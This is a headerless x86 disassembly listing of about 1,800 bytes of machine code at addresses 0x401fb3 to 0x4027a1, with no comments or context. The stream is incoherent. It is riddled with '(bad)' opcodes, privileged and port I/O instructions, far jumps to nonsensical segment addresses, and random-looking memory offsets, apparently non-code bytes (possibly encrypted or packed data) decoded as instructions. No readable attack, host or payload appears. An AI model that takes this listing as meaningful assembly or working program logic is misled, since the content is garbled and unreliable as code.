  401fb3:	arpl   WORD PTR ds:0x70f4c4ff,cx
  401fb9:	inc    edi
  401fba:	xchg   BYTE PTR cs:[ebx+0x53c93002],al
  401fc1:	rol    BYTE PTR [ecx-0x38],0x87
  401fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fc6:	js     0x40200a
  401fc8:	lods   al,BYTE PTR ds:[esi]
  401fc9:	fist   DWORD PTR [eax]
  401fcb:	lahf   
  401fcc:	ins    BYTE PTR es:[edi],dx
  401fcd:	jmp    0x401f5c
  401fcf:	mov    al,ds:0xdbabbc79
  401fd4:	dec    ebp
  401fd5:	lods   al,BYTE PTR ds:[esi]
  401fd6:	dec    ebx
  401fd7:	aas    
  401fd8:	iret   
  401fd9:	or     eax,0x94c9d1a3
  401fde:	mov    ds:0xf08c432b,al
  401fe3:	test   BYTE PTR [eax-0x23],dh
  401fe6:	push   ss
  401fe7:	sub    eax,0xcb6accf6
  401fec:	mov    edi,0x8e3704ab
  401ff1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff3:	xchg   edx,eax
  401ff4:	fcom   QWORD PTR [ecx-0x421cc894]
  401ffa:	out    0x70,al
  401ffc:	arpl   sp,ax
  401ffe:	jmp    0x40200c
  402000:	enter  0x98be,0xc7
  402004:	xchg   edi,eax
  402005:	mov    dh,0xa9
  402007:	gs and al,cl
  40200a:	xor    ch,cl
  40200c:	sbb    BYTE PTR [ebx-0x7cf85a50],0x16
  402013:	xchg   ebp,eax
  402014:	push   eax
  402015:	sysret 
  402017:	loopne 0x401fa8
  402019:	push   0xffffffca
  40201b:	and    ebp,DWORD PTR [esi+0x6a]
  40201e:	pusha  
  40201f:	mov    edx,0xc8f8c5d
  402024:	sub    BYTE PTR [ebx],0x2a
  402027:	pop    eax
  402028:	sbb    al,0x89
  40202a:	rcl    DWORD PTR [ebx-0x497fb2ca],1
  402030:	sub    BYTE PTR [esi+0x44d96f98],bh
  402036:	sar    DWORD PTR [ecx+0x30],0xea
  40203a:	sbb    eax,0x9bd7c5fb
  40203f:	test   al,0x9f
  402041:	sbb    eax,0x8eeb7794
  402047:	or     ch,bh
  402049:	mov    es,ebx
  40204b:	push   eax
  40204c:	add    edx,DWORD PTR ds:0xa6e1a5f3
  402052:	enter  0x9822,0x17
  402056:	jmp    0xa6cd5ea1
  40205b:	out    dx,eax
  40205c:	pusha  
  40205d:	jns    0x40209a
  40205f:	push   edi
  402060:	lock icebp 
  402062:	mov    edx,0x405b12b3
  402067:	test   DWORD PTR [bp-0x12],ecx
  40206b:	inc    ecx
  40206c:	ds sar ebx,1
  40206f:	xor    eax,0x260c53ca
  402074:	cmp    BYTE PTR [esi],ah
  402076:	xor    bh,BYTE PTR ss:[ecx+eax*8+0x1c]
  40207b:	add    edi,ecx
  40207d:	cwde   
  40207e:	xchg   edi,eax
  40207f:	test   BYTE PTR [eax+0x48],0xb0
  402083:	addr16 mov eax,ds:0x1bbb
  402087:	iret   
  402088:	mov    DWORD PTR [eax+0x5b],eax
  40208b:	fist   DWORD PTR [ebx+0x29]
  40208e:	xchg   BYTE PTR [ebp+ebx*1-0xc4a94d7],cl
  402095:	pop    esi
  402096:	in     al,0xb3
  402098:	div    BYTE PTR [ebp-0x49]
  40209b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40209d:	bound  edx,QWORD PTR [eax]
  40209f:	xchg   ecx,eax
  4020a0:	push   cs
  4020a1:	mov    ah,0x10
  4020a3:	enter  0xc477,0x30
  4020a7:	cmp    al,0x47
  4020a9:	lea    ecx,[ebp-0x52b7477f]
  4020af:	in     eax,0xd
  4020b1:	mov    eax,ds:0x59627ace
  4020b6:	add    DWORD PTR [esi+0x4918346b],0xffffffb2
  4020bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020be:	int    0xbf
  4020c0:	test   DWORD PTR [edx+edi*1+0x3546c9b7],ebp
  4020c7:	dec    ebx
  4020c8:	retf   
  4020c9:	or     dl,bh
  4020cb:	adc    esi,edx
  4020cd:	xchg   ebp,eax
  4020ce:	ror    BYTE PTR [esi],0xcc
  4020d1:	in     eax,0x93
  4020d3:	add    eax,DWORD PTR [edi+ecx*4-0x3824ed46]
  4020da:	fwait
  4020db:	cmp    eax,0xae382a00
  4020e0:	inc    edx
  4020e1:	xlat   BYTE PTR ds:[ebx]
  4020e2:	lock sub bl,BYTE PTR [esi+0x45]
  4020e6:	stc    
  4020e7:	fistp  QWORD PTR [ecx+0x57a0d93a]
  4020ed:	xchg   esi,eax
  4020ee:	and    eax,0xe83f4a15
  4020f3:	xchg   esi,eax
  4020f4:	sub    al,0xfb
  4020f6:	sub    eax,0xdcc8997b
  4020fb:	jmp    0x5644:0xee65d84d
  402102:	cmp    eax,0xf7380235
  402107:	lds    sp,DWORD PTR [eax]
  40210a:	sbb    eax,0x29e331d5
  40210f:	xlat   BYTE PTR ds:[ebx]
  402110:	arpl   WORD PTR [edi-0x26f04b3a],cx
  402116:	pop    esp
  402117:	cmp    al,0xc
  402119:	inc    ecx
  40211a:	pushf  
  40211b:	lahf   
  40211c:	or     dh,dl
  40211e:	push   cs
  40211f:	(bad)  
  402120:	mov    dh,0x39
  402122:	jmp    0x1666:0x1b2f163d
  402129:	dec    eax
  40212a:	mov    ah,dh
  40212c:	test   DWORD PTR [edi+0x517a624e],0x991bfd1e
  402136:	popa   
  402137:	fcomp  st(2)
  402139:	sub    ecx,edi
  40213b:	sub    edx,DWORD PTR [esi+0x6d]
  40213e:	jbe    0x402196
  402140:	gs mov esp,0x3f4d0f7e
  402146:	jnp    0x402179
  402148:	push   edx
  402149:	(bad)  
  40214a:	leave  
  40214b:	sbb    DWORD PTR [ebp*2-0x24668b55],ebx
  402152:	lods   eax,DWORD PTR ds:[esi]
  402153:	retf   0x9f48
  402156:	gs loopne 0x4021a7
  402159:	jg     0x4021a0
  40215b:	pop    edi
  40215d:	push   ebp
  40215e:	fwait
  40215f:	xor    ecx,DWORD PTR [ecx+esi*2]
  402162:	les    esp,FWORD PTR [edx-0x326b3904]
  402168:	pop    esi
  402169:	sub    ch,BYTE PTR [eax-0x4693a53d]
  40216f:	in     al,0x73
  402171:	pusha  
  402172:	add    DWORD PTR [esi],esi
  402174:	push   esp
  402175:	in     eax,dx
  402176:	loope  0x40212a
  402178:	dec    ecx
  402179:	dec    eax
  40217a:	fdiv   DWORD PTR [eax-0x1b]
  40217d:	repnz pop ss
  40217f:	int3   
  402180:	jae    0x40215d
  402182:	add    eax,edi
  402184:	dec    ecx
  402185:	add    edx,edx
  402187:	sahf   
  402188:	jmp    FWORD PTR [edx+0x1e9a43bc]
  40218e:	xor    eax,0xb4e6230a
  402193:	dec    edx
  402194:	in     al,0xef
  402196:	push   0xffffffd9
  402198:	dec    eax
  402199:	cs into 
  40219b:	cld    
  40219c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40219d:	popf   
  40219e:	sbb    DWORD PTR [ebx],edi
  4021a0:	pop    esi
  4021a1:	cmc    
  4021a2:	mov    ebx,DWORD PTR cs:0xbb23b966
  4021a9:	and    DWORD PTR [eax+0x71],edx
  4021ac:	sbb    al,0xb3
  4021ae:	xor    BYTE PTR [edi],al
  4021b0:	mov    ecx,cs
  4021b2:	xchg   edx,eax
  4021b3:	icebp  
  4021b4:	rcr    BYTE PTR [ebx],0xb4
  4021b7:	cmp    BYTE PTR [edi],cl
  4021b9:	cdq    
  4021ba:	push   ds
  4021bb:	inc    ecx
  4021bc:	sbb    esi,edx
  4021be:	xor    cl,dh
  4021c0:	stos   BYTE PTR es:[edi],al
  4021c1:	mov    dh,BYTE PTR [ecx+eiz*4]
  4021c4:	xor    dh,BYTE PTR [edx]
  4021c6:	pop    edx
  4021c7:	(bad)  
  4021c8:	push   cs
  4021c9:	daa    
  4021ca:	sbb    al,BYTE PTR [esi]
  4021cc:	cld    
  4021cd:	in     eax,dx
  4021ce:	or     cl,dh
  4021d0:	out    0x30,al
  4021d2:	xchg   edi,eax
  4021d3:	push   0x2f963c65
  4021d8:	aaa    
  4021d9:	enter  0x5d3a,0xed
  4021dd:	test   eax,0xe3764631
  4021e2:	pop    ss
  4021e3:	ja     0x402244
  4021e5:	xchg   edx,eax
  4021e6:	cwde   
  4021e7:	cmc    
  4021e8:	mov    ebp,0x5a6fcf18
  4021ed:	or     edx,0xffffffa8
  4021f0:	sbb    edx,esi
  4021f2:	mov    ch,0xde
  4021f4:	mov    ds:0x9e8910e,al
  4021f9:	sub    al,0xb6
  4021fb:	jmp    eax
  4021fd:	or     bh,BYTE PTR [edx-0x71]
  402200:	outs   dx,BYTE PTR ds:[esi]
  402201:	mov    esp,0x6f7ed64f
  402206:	jae    0x4021a7
  402208:	les    eax,FWORD PTR [ebx+ecx*2]
  40220b:	adc    ecx,edi
  40220d:	test   eax,0x645700fd
  402212:	js     0x402207
  402214:	xchg   edx,eax
  402215:	sub    BYTE PTR [ecx],bh
  402217:	imul   edi,DWORD PTR [eax],0xffffff90
  40221a:	jg     0x402270
  40221c:	data16 and cl,ah
  40221f:	out    0x4,eax
  402221:	jmp    0x402200
  402223:	js     0x402273
  402225:	or     BYTE PTR [ecx-0xf],bl
  402228:	shl    DWORD PTR [esp+eax*4+0x16],cl
  40222c:	rol    BYTE PTR [edx+0x76],cl
  40222f:	rol    ah,1
  402231:	(bad)  [edx]
  402233:	in     al,0xe6
  402235:	jns    0x4021f1
  402237:	ds ret 0xf16f
  40223b:	xchg   ebp,eax
  40223c:	imul   esi,DWORD PTR [edi+0x48],0x1d2692c3
  402243:	push   ebp
  402244:	cmp    al,0xe8
  402246:	sub    ah,BYTE PTR [bx+si]
  402249:	ror    DWORD PTR [eax],1
  40224b:	inc    ebx
  40224c:	(bad)  
  40224d:	jns    0x40227d
  40224f:	and    eax,0x62ca0626
  402254:	test   al,0x70
  402256:	mov    al,ds:0xeaf810c8
  40225b:	adc    eax,0xa74c0abf
  402260:	push   esp
  402261:	stos   DWORD PTR es:[edi],eax
  402262:	fisub  DWORD PTR [esp+ebx*2-0x44]
  402266:	sbb    DWORD PTR ds:0x1aebe854,esi
  40226c:	pop    ebx
  40226d:	and    BYTE PTR [esi+0x77],bh
  402270:	push   ebp
  402271:	test   eax,0x59add23a
  402276:	add    al,0x35
  402278:	add    eax,0x83dabc4f
  40227d:	sub    eax,0xbe1a7cc0
  402282:	(bad)  
  402283:	mov    edx,0x7269f5d7
  402288:	pop    eax
  402289:	jle    0x402218
  40228b:	mov    dh,0x33
  40228d:	sub    DWORD PTR [ecx-0x428f38db],edi
  402293:	cwde   
  402294:	fistp  QWORD PTR [ecx]
  402296:	cdq    
  402297:	sub    ax,0xc5bf
  40229b:	daa    
  40229c:	add    ebx,DWORD PTR [edi-0x1a4936c9]
  4022a2:	sub    DWORD PTR ds:0x5e4e70d0,0xffffffa5
  4022a9:	retf   
  4022aa:	cmp    bl,dl
  4022ac:	jl     0x402242
  4022ae:	xor    eax,0xa450ce7e
  4022b3:	jbe    0x402303
  4022b5:	xchg   DWORD PTR [edi+0x4e],ebp
  4022b8:	jle    0x402339
  4022ba:	add    edx,esi
  4022bc:	mov    esp,DWORD PTR ds:0x9d95c4e1
  4022c2:	fmul   DWORD PTR [ebp+0x5b]
  4022c5:	jne    0x4022c1
  4022c7:	fcom   DWORD PTR [esi+0x4e7cb8b7]
  4022cd:	scas   eax,DWORD PTR es:[edi]
  4022ce:	dec    eax
  4022cf:	loop   0x4022f2
  4022d1:	pop    esp
  4022d2:	ret    0xcf69
  4022d5:	or     eax,0x2b64dc16
  4022da:	or     edi,DWORD PTR [ebp-0x275594b8]
  4022e0:	enter  0xe85c,0xdc
  4022e4:	adc    al,0x14
  4022e6:	jno    0x402355
  4022e8:	push   ecx
  4022e9:	aas    
  4022ea:	cmp    BYTE PTR [edi],dh
  4022ec:	mov    DWORD PTR [eax+0x2b051043],esi
  4022f2:	rcl    edx,1
  4022f4:	pop    ds
  4022f5:	xchg   ecx,eax
  4022f6:	and    eax,0x9eb8e309
  4022fb:	dec    ebp
  4022fc:	dec    ebp
  4022fd:	lahf   
  4022fe:	add    eax,0x7bd3a162
  402303:	cmp    BYTE PTR [edx+0xc0b0e58],dl
  402309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230a:	dec    DWORD PTR [ecx-0x59f7ba86]
  402310:	push   esi
  402311:	loopne 0x402389
  402313:	(bad)  
  402314:	es dec edi
  402316:	loopne 0x4022ae
  402318:	sbb    ah,BYTE PTR [ebx+ecx*1-0x43]
  40231c:	push   0xffffff82
  40231e:	add    BYTE PTR [esi-0xdad1c5c],dh
  402324:	mov    ch,0x19
  402326:	setge  al
  402329:	rcr    BYTE PTR [ebx],cl
  40232b:	xor    al,0x45
  40232d:	jmp    0xa58dfe85
  402332:	out    0xf4,eax
  402334:	ins    DWORD PTR es:[edi],dx
  402335:	neg    ch
  402337:	sbb    al,BYTE PTR [ebp-0x3a]
  40233a:	sbb    eax,0x515fb54e
  40233f:	idiv   BYTE PTR [edx]
  402341:	mov    ebp,0x4ad6d08b
  402346:	fld    DWORD PTR [ebx+0x3e82199b]
  40234c:	loopne 0x40238b
  40234e:	scas   al,BYTE PTR es:[edi]
  40234f:	mov    esp,0x78158740
  402354:	and    ebp,DWORD PTR [ecx-0x65]
  402357:	arpl   WORD PTR [ebx+0x0],cx
  40235a:	add    DWORD PTR [edi+edx*4+0x772f719e],edi
  402361:	mov    cl,0x93
  402363:	mov    edi,0xd6caba52
  402368:	sar    BYTE PTR [esi-0x64],1
  40236b:	or     DWORD PTR [ecx+0x16],ecx
  40236e:	jecxz  0x4023da
  402370:	imul   esi,DWORD PTR [ecx-0x32070796],0x7e630dc7
  40237a:	adc    bl,al
  40237c:	gs xchg esp,eax
  40237e:	xchg   DWORD PTR [edi-0x3e],esi
  402381:	dec    ebp
  402382:	add    ebx,DWORD PTR [eax-0x6ab1f573]
  402388:	adc    al,0xaa
  40238a:	jbe    0x40237b
  40238c:	pop    DWORD PTR [ebx]
  40238e:	xchg   BYTE PTR [eax+0x34],dl
  402391:	xchg   edi,edi
  402393:	repnz out dx,eax
  402395:	pop    ebx
  402396:	xchg   esi,eax
  402397:	or     eax,0x44e90eee
  40239c:	mov    DWORD PTR [ecx+0xe95a5d2],esp
  4023a2:	scas   al,BYTE PTR es:[edi]
  4023a3:	fnstenv [ebx-0x20]
  4023a6:	cwde   
  4023a7:	sbb    eax,0x32c71e2
  4023ac:	sahf   
  4023ad:	mov    ds:0xc16d2c63,al
  4023b2:	(bad)  
  4023b3:	fidiv  WORD PTR [esi-0xa2a8729]
  4023b9:	out    dx,al
  4023ba:	jg     0x402413
  4023bc:	stos   BYTE PTR es:[edi],al
  4023bd:	mov    cl,bl
  4023bf:	imul   edx,DWORD PTR [ebp+0x27],0x29
  4023c3:	mov    cl,0x6a
  4023c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023c6:	and    BYTE PTR [ecx-0x58],dl
  4023c9:	fucompp 
  4023cb:	pop    ds
  4023cc:	add    ch,dl
  4023ce:	clc    
  4023cf:	leave  
  4023d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d1:	and    eax,0x4dfdc197
  4023d6:	adc    bl,BYTE PTR ds:0x1cc9eccb
  4023dc:	mov    eax,0x63d423b7
  4023e1:	adc    eax,0x8be42b2
  4023e6:	in     al,dx
  4023e7:	cmp    al,0x99
  4023e9:	push   0xedc247dd
  4023ee:	jb     0x402403
  4023f0:	adc    DWORD PTR [eax+0x23],edi
  4023f3:	xchg   ebp,eax
  4023f4:	das    
  4023f5:	imul   edi,DWORD PTR [edx-0x349b9dbe],0x4b4c861
  4023ff:	push   ss
  402400:	retf   
  402401:	loopne 0x40239f
  402403:	pop    eax
  402404:	jg     0x4023c6
  402406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402407:	fimul  WORD PTR [esi+0x24dd1bc4]
  40240d:	mov    bh,0xe8
  40240f:	mov    al,0x1
  402411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402412:	cmp    DWORD PTR [edx+0x27],0x38
  402416:	pushf  
  402417:	aad    0x8b
  402419:	mov    esp,0x541c425e
  40241e:	sub    bl,BYTE PTR [ebx-0x17]
  402421:	popa   
  402422:	jo     0x402490
  402424:	cmova  edx,DWORD PTR [edi]
  402427:	jno    0x4023e9
  402429:	mov    dh,0xb9
  40242b:	or     eax,0xb79791b2
  402430:	add    DWORD PTR es:[ebp+eiz*1-0x1c3c0627],ebp
  402438:	jle    0x4023eb
  40243a:	ins    BYTE PTR es:[edi],dx
  40243b:	aam    0xec
  40243d:	lahf   
  40243e:	xchg   ebx,eax
  40243f:	repz and ah,BYTE PTR [edx]
  402442:	or     al,cl
  402444:	mul    BYTE PTR [edi+edi*8+0x51]
  402448:	stos   DWORD PTR es:[edi],eax
  402449:	popa   
  40244a:	sub    BYTE PTR [ebx+0x383589b],0xd9
  402451:	inc    edx
  402452:	adc    BYTE PTR [esi-0x2e81eef4],0x20
  402459:	and    DWORD PTR ds:0x51b6e5dd,esp
  40245f:	dec    ebx
  402460:	test   BYTE PTR [eax+0x1],dh
  402463:	dec    esp
  402464:	retf   
  402465:	(bad)  
  402466:	icebp  
  402467:	ficom  DWORD PTR [esi+0x2a]
  40246a:	adc    eax,0x902f7b64
  40246f:	test   eax,0xbea7f37
  402474:	(bad)  
  402475:	fdiv   QWORD PTR [edi-0x10]
  402478:	test   BYTE PTR [ecx-0x73],al
  40247b:	js     0x4024f2
  40247d:	inc    edi
  40247e:	xchg   edx,eax
  40247f:	fmul   DWORD PTR [edi-0x73]
  402482:	jl     0x4024a5
  402484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402485:	inc    ebp
  402486:	sub    eax,0xba455463
  40248b:	hlt    
  40248c:	push   0x709cdb5d
  402491:	mov    BYTE PTR [eax+0x16d31269],dh
  402497:	pop    es
  402498:	js     0x40241e
  40249a:	or     ebp,DWORD PTR [edi+0x14]
  40249d:	test   al,0x14
  40249f:	pop    edi
  4024a0:	fmul   QWORD PTR [ebx]
  4024a2:	loopne 0x402444
  4024a4:	and    edx,DWORD PTR [eax]
  4024a6:	xchg   esp,eax
  4024a7:	std    
  4024a8:	(bad)  
  4024a9:	xor    esp,eax
  4024ab:	je     0x4024c6
  4024ad:	retf   0x78da
  4024b0:	dec    ebp
  4024b1:	in     eax,0xd5
  4024b3:	cmp    al,0xe
  4024b5:	clc    
  4024b6:	aaa    
  4024b7:	addr16 icebp 
  4024b9:	sub    al,0x6e
  4024bb:	and    al,ch
  4024bd:	shl    BYTE PTR [esi-0x4c],1
  4024c0:	xchg   edi,eax
  4024c1:	jo     0x402480
  4024c3:	aas    
  4024c4:	jmp    0xbed2:0xa0eba7fb
  4024cb:	test   eax,0xd675f65e
  4024d0:	add    ebp,DWORD PTR [eax+0x48]
  4024d3:	sbb    BYTE PTR [ecx+ecx*2-0x16],ah
  4024d7:	xor    eax,0x28e1f351
  4024dc:	cli    
  4024dd:	pop    DWORD PTR [ecx+0x35]
  4024e0:	fisttp DWORD PTR [eax+0x5c]
  4024e3:	inc    edi
  4024e4:	mov    dh,dh
  4024e6:	fsubr  DWORD PTR [esi+edx*8]
  4024e9:	int3   
  4024ea:	mov    ecx,0xae530acd
  4024ef:	subps  xmm3,XMMWORD PTR [edx+0x28]
  4024f3:	push   0x6f
  4024f5:	loop   0x402488
  4024f7:	add    ebp,DWORD PTR [ebp+0x74]
  4024fa:	(bad)  
  4024fb:	stos   DWORD PTR es:[edi],eax
  4024fc:	loopne 0x40248f
  4024fe:	pop    edi
  4024ff:	mov    edi,0x38acd4b4
  402504:	clc    
  402505:	dec    edx
  402506:	rol    edi,1
  402508:	adc    bh,bh
  40250a:	push   0x9518be71
  40250f:	mov    ebp,0xad5d0294
  402514:	int3   
  402515:	mov    esi,0x3c90b866
  40251a:	adc    BYTE PTR [edi+edi*8+0x44b9ed17],dl
  402521:	and    BYTE PTR [ebp-0x9],dl
  402524:	push   eax
  402525:	pushf  
  402526:	adc    DWORD PTR [edi-0x3535166b],edi
  40252c:	js     0x402549
  40252e:	jno    0x40257a
  402530:	shr    edi,cl
  402532:	push   es
  402533:	retf   
  402534:	inc    edx
  402535:	sbb    edi,DWORD PTR [edi-0x165f1e6a]
  40253b:	xor    bl,BYTE PTR [edi-0x6aaf7175]
  402541:	not    bl
  402543:	xchg   ecx,eax
  402544:	add    al,0x92
  402546:	icebp  
  402547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402548:	mov    dl,0x79
  40254a:	jmp    0x402541
  40254c:	out    0xfc,al
  40254e:	push   ebx
  40254f:	sbb    DWORD PTR [esi+0x45bf522c],esi
  402555:	lock nop
  402557:	adc    cl,BYTE PTR [ecx]
  402559:	sub    DWORD PTR [edi],esp
  40255b:	pop    es
  40255c:	in     al,dx
  40255d:	fcomp  DWORD PTR [ebx+0x30244ced]
  402563:	stos   BYTE PTR es:[edi],al
  402564:	rcl    BYTE PTR ds:0x51c4c529,1
  40256a:	adc    BYTE PTR [esi],ch
  40256c:	hlt    
  40256d:	shl    BYTE PTR [ebx],1
  40256f:	rcl    BYTE PTR [edx],cl
  402571:	mov    ah,0x7c
  402573:	xchg   BYTE PTR [ecx+esi*1+0x6f],dh
  402577:	add    eax,DWORD PTR [edx+0x49]
  40257a:	or     dh,0x65
  40257d:	pop    edi
  40257e:	add    al,0x50
  402580:	dec    edx
  402581:	jp     0x402577
  402583:	scas   al,BYTE PTR es:[edi]
  402584:	data16 jno 0x4025aa
  402587:	loop   0x40253d
  402589:	lods   eax,DWORD PTR ds:[esi]
  40258a:	add    al,0xb1
  40258c:	dec    edi
  40258d:	and    esp,DWORD PTR [ebp-0x39]
  402590:	in     eax,dx
  402591:	loopne 0x4025fb
  402593:	pop    esp
  402594:	push   es
  402595:	adc    esi,esp
  402597:	(bad)  
  402598:	sar    dl,1
  40259a:	sbb    eax,0xa67a1715
  40259f:	pop    edx
  4025a0:	pop    eax
  4025a1:	jmp    0x25fb23a
  4025a6:	ret    0x5733
  4025a9:	pop    ebp
  4025aa:	imul   esp,DWORD PTR [edx+edx*1-0x45],0xffffffa9
  4025af:	mov    esi,DWORD PTR [eax+0x12b6611b]
  4025b5:	dec    ecx
  4025b6:	iret   
  4025b7:	mov    al,0x35
  4025b9:	adc    ch,BYTE PTR [eax+0x4354fbde]
  4025bf:	ja     0x402547
  4025c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025c2:	mov    ecx,0x861d9da2
  4025c7:	xor    BYTE PTR [edi+0x15216f9b],ah
  4025cd:	jo     0x4025ab
  4025cf:	and    bl,BYTE PTR [ebx-0x1a6c6151]
  4025d5:	xor    al,0xf2
  4025d7:	xchg   cl,al
  4025d9:	mov    esp,0x5f320ef3
  4025de:	jns    0x40256d
  4025e0:	mov    esp,DWORD PTR [ebp+0x66b623b2]
  4025e6:	pop    esp
  4025e7:	push   ds
  4025e8:	jp     0x402611
  4025ea:	pop    ecx
  4025eb:	and    eax,0xf08fd516
  4025f0:	out    dx,eax
  4025f1:	out    dx,al
  4025f2:	inc    esp
  4025f3:	les    eax,FWORD PTR [edx+0x6e49ff75]
  4025f9:	pop    esp
  4025fa:	or     esi,0x49f0f52c
  402600:	jg     0x402622
  402602:	push   cs
  402603:	rol    ebp,cl
  402605:	mov    fs,WORD PTR [edi+eax*8-0xc]
  402609:	push   ebp
  40260a:	aas    
  40260b:	pushf  
  40260c:	aad    0x9e
  40260e:	xor    edi,esp
  402610:	pop    eax
  402611:	ja     0x40268c
  402613:	dec    ebx
  402614:	iret   
  402615:	mov    bh,0xb6
  402617:	pop    ebx
  402618:	jmp    0xd4f4d19a
  40261d:	xlat   BYTE PTR ds:[ebx]
  40261e:	test   DWORD PTR [ebx+edi*4-0x5d01e110],esp
  402625:	sbb    ebx,DWORD PTR [esi]
  402627:	xor    eax,0x57bfffd7
  40262c:	mov    sp,?
  40262f:	and    al,0xf0
  402631:	sbb    ah,0xe1
  402634:	idiv   BYTE PTR [ebp+0x7c94988e]
  40263a:	mov    BYTE PTR [esi+ecx*8-0x6b05797a],cl
  402641:	loop   0x402663
  402643:	fidiv  DWORD PTR [edi-0x4a]
  402646:	xor    esi,DWORD PTR [edx+0x3e026e05]
  40264c:	and    BYTE PTR [edx-0x7ae7aa8f],cl
  402652:	dec    ecx
  402653:	in     al,0x33
  402655:	out    dx,eax
  402656:	push   ebp
  402657:	pusha  
  402658:	sbb    ebx,ebp
  40265a:	xchg   edi,eax
  40265b:	shl    ebx,0x78
  40265e:	sar    DWORD PTR [esi],cl
  402660:	jmp    0x4026e1
  402662:	(bad)  [edi]
  402664:	test   al,0x76
  402666:	pop    es
  402667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402668:	inc    ecx
  402669:	addr16 into 
  40266b:	test   DWORD PTR ds:0x3d3c8bba,edx
  402671:	repz sub eax,0xd38dd1bb
  402677:	pop    es
  402678:	dec    edi
  402679:	cdq    
  40267a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40267c:	leave  
  40267d:	or     al,0x37
  40267f:	inc    ebp
  402680:	aad    0x67
  402682:	xor    al,0x17
  402684:	rol    BYTE PTR [edi],cl
  402686:	adc    bl,BYTE PTR [edx]
  402688:	sti    
  402689:	xor    al,0x6f
  40268b:	sub    al,0x46
  40268d:	in     al,dx
  40268e:	test   esp,ebp
  402690:	cmp    ebp,DWORD PTR [ebx+ebp*1]
  402693:	push   es
  402694:	es jge 0x402694
  402697:	mov    al,0x59
  402699:	xchg   esi,eax
  40269a:	jmp    0x402639
  40269c:	lahf   
  40269d:	or     DWORD PTR [edi+0x38b946d4],esp
  4026a3:	jno    0x402634
  4026a5:	bound  ebx,QWORD PTR [ecx-0x19]
  4026a8:	mov    dh,0xae
  4026aa:	jp     0x4026a5
  4026ac:	pusha  
  4026ad:	cmp    BYTE PTR [edi+0x19],ah
  4026b0:	lods   eax,DWORD PTR ds:[esi]
  4026b1:	sbb    eax,0x79e0f563
  4026b6:	xor    eax,0xd04aa22f
  4026bb:	cmp    al,ah
  4026bd:	pop    ecx
  4026be:	and    DWORD PTR [esi+0x6553d800],ebp
  4026c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c5:	push   edi
  4026c6:	or     edi,DWORD PTR [edi+edi*1]
  4026c9:	mov    al,ds:0x5506d9c6
  4026ce:	xor    ch,BYTE PTR [ebp-0x35]
  4026d1:	bound  ecx,QWORD PTR [edx-0x1b]
  4026d4:	(bad)  
  4026d5:	sbb    BYTE PTR ds:[ebp+0x24],bl
  4026d9:	das    
  4026da:	(bad)  
  4026db:	and    eax,0x5630e9c3
  4026e0:	xchg   BYTE PTR [ebp-0xddd01e6],ah
  4026e6:	(bad)  
  4026e7:	fisub  DWORD PTR [ebp-0x48]
  4026ea:	mov    bh,0x73
  4026ec:	mov    al,0xdc
  4026ee:	push   0xffffff81
  4026f0:	dec    ebp
  4026f1:	out    dx,eax
  4026f2:	sbb    al,BYTE PTR [edx]
  4026f4:	push   esp
  4026f5:	sub    eax,0x912cb828
  4026fa:	pop    esp
  4026fb:	test   al,0xfb
  4026fd:	mov    ecx,0xf654f4f7
  402702:	lock xchg DWORD PTR [ebp+0x74],ebx
  402706:	cli    
  402707:	mov    al,ds:0x23c97a01
  40270c:	outs   dx,DWORD PTR ds:[esi]
  40270d:	add    eax,0x461ea836
  402712:	test   DWORD PTR [edi],ebp
  402714:	aad    0x79
  402716:	sbb    DWORD PTR [esi-0x24],ebx
  402719:	mov    edx,0xe189b86a
  40271e:	adc    BYTE PTR [esi+ebp*1],bl
  402721:	(bad)
  402724:	repz and ah,bh
  402727:	xchg   esp,eax
  402728:	mov    cl,0xfe
  40272a:	pusha  
  40272b:	jae    0x402794
  40272d:	mov    cl,0xc2
  40272f:	xchg   edi,eax
  402730:	add    edi,eax
  402732:	adc    BYTE PTR [edx+0x6c],0x65
  402736:	ret    
  402737:	ss clc 
  402739:	mov    eax,ds:0x483e11c8
  40273e:	adc    DWORD PTR [eax+0x61442928],ebp
  402744:	imul   ebx,DWORD PTR [edx+0x46660e9c],0xffffffe6
  40274b:	cmp    BYTE PTR ds:0xef7b9f2f,ah
  402751:	out    0xb6,al
  402753:	mov    dh,0xe8
  402755:	imul   ebp,DWORD PTR [ecx+0x56],0xffffff88
  402759:	dec    edx
  40275a:	sub    al,0xa3
  40275c:	icebp  
  40275d:	or     al,0x95
  40275f:	inc    esi
  402760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402761:	and    al,BYTE PTR [edi+0x30]
  402764:	sbb    al,0x6d
  402766:	mov    al,ds:0xc37cd432
  40276b:	call   0x1865c41d
  402770:	std    
  402771:	add    al,BYTE PTR [edi]
  402773:	cwde   
  402774:	in     al,dx
  402775:	add    BYTE PTR [ebx-0x3f],ah
  402778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402779:	ficomp DWORD PTR [eax+edi*4]
  40277c:	push   ss
  40277d:	xchg   ecx,eax
  40277e:	lock jle 0x402704
  402781:	inc    ebp
  402782:	mov    ecx,DWORD PTR [ecx]
  402784:	inc    eax
  402785:	jno    0x4027b0
  402787:	pop    ebx
  402788:	sbb    ah,al
  40278a:	mov    ecx,0x675be7ea
  40278f:	jecxz  0x4027d0
  402791:	push   0xffffffac
  402793:	mov    ds:0x705c5b6d,al
  402798:	inc    eax
  402799:	in     eax,0x77
  40279b:	mov    es,edi
  40279d:	aaa    
  40279e:	and    BYTE PTR [eax],0xc1
  4027a1:	rcl    BYTE PTR [edi-0x5fcf68d5],cl
